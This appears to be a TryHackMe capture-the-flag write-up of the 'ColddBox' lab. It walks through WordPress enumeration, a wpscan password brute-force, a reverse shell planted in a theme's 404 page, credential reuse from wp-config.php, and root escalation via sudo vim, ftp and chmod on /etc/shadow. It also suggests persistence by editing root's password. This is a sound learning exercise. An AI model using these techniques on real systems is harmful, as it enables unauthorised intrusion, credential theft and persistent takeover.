---
title: "Colddbox"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

{{< post-img src="colddbox.png" alt="colddbox" style="width: 200px;" >}}

## Enumeration


```bash
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31

```

```bash
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/hidden               (Status: 301) [Size: 311] [--> http://10.10.32.43/hidden/]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.32.43/]
/server-status        (Status: 403) [Size: 276]
/wp-admin             (Status: 301) [Size: 313] [--> http://10.10.32.43/wp-admin/]
/wp-content           (Status: 301) [Size: 315] [--> http://10.10.32.43/wp-content/]
/wp-includes          (Status: 301) [Size: 316] [--> http://10.10.32.43/wp-includes/]
/xmlrpc.php           (Status: 200) [Size: 42]
```

Guess the CMS! lol lets check the hidden dir first

```text
U-R-G-E-N-T
C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip

```

Well...what can I say? sounds like bruteforce

Either `hydra` for "speed" or `wpscan` for simplicity (failure message for wordpress)

I chose wpscan this time

Tried Hugo and Philip but it didnt work so C0ldd

```bash
...
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - c0ldd / 9876543210
Trying c0ldd / 7654321 Time: 00:03:13 <                                                                                                                                                            > (1225 / 14345617)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210

```

So let's GO! on admin dashboard we go for appearance editor

classic reverse shell in 404 page

then visit 'http://10.10.196.224/wp-content/themes/twentyfifteen/404.php` to get access

```bash
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 46852
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:30:02 up 15 min,  0 users,  load average: 0.29, 0.87, 0.68
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ColddBox-Easy:/$

```
Try to get user flag

```bash
www-data@ColddBox-Easy:/$ ls
ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
www-data@ColddBox-Easy:/$ cd /home
cd /home
www-data@ColddBox-Easy:/home$ ls
ls
c0ldd
www-data@ColddBox-Easy:/home$ cd c0ldd
cd c0ldd
www-data@ColddBox-Easy:/home/c0ldd$ ls
ls
user.txt
www-data@ColddBox-Easy:/home/c0ldd$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```
Be disappointed!

Enumerate more...Remember to always check php config code!

Back to /var/www/html look for config files

```bash
www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
cat wp-config.php

...

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

...

```
Take some pride

```bash
www-data@ColddBox-Easy:/var/www/html$ su c0ldd
su c0ldd
Password: cybersecurity

c0ldd@ColddBox-Easy:/var/www/html$ cat /home/c0ldd/user.txt
cat /home/c0ldd/user.txt
c2lrZSEgdGhhdCdzIHRoZSB3cm9uZyBmbGFnIQ==
```

## privilege escalation

Ok the real thing starts here!

the author said there were many ways to Privesc so let's explore some

```bash
c0ldd@ColddBox-Easy:/var/www/html$ sudo -l
sudo -l
[sudo] password for c0ldd: cybersecurity

Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```
```bash
c0ldd@ColddBox-Easy:/var/www/html$ find / -perm -u=s 2>/dev/null
find / -perm -u=s 2>/dev/null
/bin/su
/bin/ping6
/bin/ping
/bin/fusermount
/bin/umount
/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/find
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

```bash
c0ldd@ColddBox-Easy:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```
hmm yeah...some ways with sudo!

```bash
c0ldd@ColddBox-Easy:/var/www/html$ netstat -tunlp
netstat -tunlp
(No todos los procesos pueden ser identificados, no hay información de propiedad del proceso
 no se mostrarán, necesita ser superusuario para verlos todos.)
Conexiones activas de Internet (solo servidores)
Proto  Recib Enviad Dirección local         Dirección remota       Estado       PID/Program name
tcp        0      0 0.0.0.0:4512            0.0.0.0:*               ESCUCHAR    -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               ESCUCHAR    -
tcp6       0      0 :::4512                 :::*                    ESCUCHAR    -
tcp6       0      0 :::80                   :::*                    ESCUCHAR    -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

Aha! seems like I missed a port earlier! SSH is open on a high port

```bash
PORT     STATE  SERVICE REASON       VERSION
3306/tcp closed mysql   conn-refused
4512/tcp open   ssh     syn-ack      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDngxJmUFBAeIIIjZkorYEp5ImIX0SOOFtRVgperpxbcxDAosq1rJ6DhWxJyyGo3M+Fx2koAgzkE2d4f2DTGB8sY1NJP1sYOeNphh8c55Psw3Rq4xytY5u1abq6su2a1Dp15zE7kGuROaq2qFot8iGYBVLMMPFB/BRmwBk07zrn8nKPa3yotvuJpERZVKKiSQrLBW87nkPhPzNv5hdRUUFvImigYb4hXTyUveipQ/oji5rIxdHMNKiWwrVO864RekaVPdwnSIfEtVevj1XU/RmG4miIbsy2A7jRU034J8NEI7akDB+lZmdnOIFkfX+qcHKxsoahesXziWw9uBospyhB
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKNmVtaTpgUhzxZL3VKgWKq6TDNebAFSbQNy5QxllUb4Gg6URGSWnBOuIzfMAoJPWzOhbRHAHfGCqaAryf81+Z8=
|   256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE/fNq/6XnAxR13/jPT28jLWFlqxd+RKSbEgujEaCjEc
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

nice! we have a quicker access with `c0ldd:cybersecurity`!

```bash
└──╼ $ssh c0ldd@10.10.231.210 -p 4512
The authenticity of host '[10.10.231.210]:4512 ([10.10.231.210]:4512)' can't be established.
ECDSA key fingerprint is SHA256:xDx1I3ynEOfBDWPnJPLQG+C4XjZhBw/6Rig/bz2tMxM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.231.210]:4512' (ECDSA) to the list of known hosts.
c0ldd@10.10.231.210's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


Pueden actualizarse 129 paquetes.
92 actualizaciones son de seguridad.


Last login: Mon Nov  8 13:20:08 2021 from 10.0.2.15
c0ldd@ColddBox-Easy:~$
well..enumeration is always the key ! I also checked for processes, key files permissions...

"information is power" so you can add `linenum` to get more

I only use those scripts as last resort so I wont do it!

there is already 3 main methods anyway

Feel free to ssh to try more...

```
### The good old way

We already know vim/vi or some text editors run commands so basically if they run as root

we run commands as root...ask nicely for a shell

```bash
c0ldd@ColddBox-Easy:~$ sudo vim -c ':!/bin/sh'
[sudo] password for c0ldd:

# id
uid=0(root) gid=0(root) groups=0(root)

```

### The file transfer pwnage

ftp runs commands? who would know?

```bash
c0ldd@ColddBox-Easy:~$ sudo ftp
ftp> !/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)

```
### Changing the owner

sudo on chmod is like communism memes, it belongs to everyone

```bash
c0ldd@ColddBox-Easy:~$ sudo chmod 777 /etc/shadow
c0ldd@ColddBox-Easy:~$ cat /etc/shadow | grep c0ldd
c0ldd:$6$AnciUfDx$Y9lDZThc6/Q/rWMajprHD54ynCLBmy8swBujZO.CG6b7j7YZiR/RIrdhzn2euH1A9r2jJE2U0bbLarUFdwSI40:18529:0:99999:7:::
c0ldd@ColddBox-Easy:~$ cat /etc/shadow | grep root
root:$6$VMnvWAfh$Yg04FhiScJ8Pv3ET6Ys.4G.BdLC0HyyxcDB1jVa28F20gdz4zI.GyrQSg8elF4nx3yH1g3ZKA/uvO8Fqll.T70:18939:0:99999:7:::

```
At this point you can do anything lol!

you are basically root already

Like seriously

```bash
c0ldd@ColddBox-Easy:~$ sudo chmod 777 /root
c0ldd@ColddBox-Easy:~$ cd /root
c0ldd@ColddBox-Easy:/root$ ls
root.txt
c0ldd@ColddBox-Easy:~$ sudo chmod 777 /root
c0ldd@ColddBox-Easy:~$ cd /root
c0ldd@ColddBox-Easy:/root$ ls
root.txt
```

If you want real persistence just change root password in /etc/shadow

or just add a user with superprivileges idk...get creative

Now whatever method suits you, Don forget to grab the stuff

```bash
# cd /root
# ls
root.txt
# cat root.txt
QSBmb29sIGNhbm5vdCBiZSBmb29sZWQgdHdpY2U=
```
I don't know if there is more privesc ways but i might find out later

Feel free to explore and find more too.
